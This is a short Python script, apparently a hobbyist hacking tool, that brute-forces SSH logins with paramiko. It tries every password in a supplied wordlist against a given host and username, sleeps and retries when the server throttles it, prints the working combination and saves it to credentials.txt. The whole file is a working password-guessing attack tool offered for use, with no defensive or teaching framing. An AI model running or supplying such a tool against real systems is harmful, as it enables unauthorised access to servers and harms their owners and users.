import paramiko
import socket as socket
import time
import colorama
import optparse
colorama.init()
import argparse
GREEN = colorama.Fore.GREEN
RED   = colorama.Fore.RED
RESET = colorama.Fore.RESET
BLUE  = colorama.Fore.BLUE


def ssh_open(hostname,username,password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
            client.connect(hostname = hostname,username = username,password= password,timeout=timeout )
           
    except socket.timeout:
        print(f"{RED} !!![host]: {hostname} Hostname is unreachable,timed out {RESET}")
        return False
       
    except paramiko.AuthenticationException:
        print(f"{RED} !!![username and password]: invalid credentials for {username}:{password} ")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*] Quota exceeded, retrying with delay...{RESET}")
        time.sleep(60)
        return ssh_open(hostname,username,password)
    else:
        print(f"{GREEN} combo found succesfully: \n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True
 
def getting_input():
    object_parse = optparse.OptionParser()
    object_parse.add_option("-i", "--hostname", dest="hostname", help="hostname to change")
    object_parse.add_option("-u", "--username", dest="username", help="username to change")
    object_parse.add_option("-p", "--passlist", dest="passlist", help="passlist to change")
    object_parse.add_option("-t", "--timeout", dest="timeout", help="timeout to change")
    return object_parse.parse_args()
[user_input,arguements] = getting_input() 

if __name__ == '__main__':
    passlist = user_input.passlist
    hostname = user_input.hostname
    username = user_input.username
    timeout = user_input.timeout
    passlist = open(passlist).read().splitlines()
    for password in passlist:
        if ssh_open(hostname,username,password):
            open("credentials.txt", "w").write(f"{username}@{hostname}:{password}")
            break
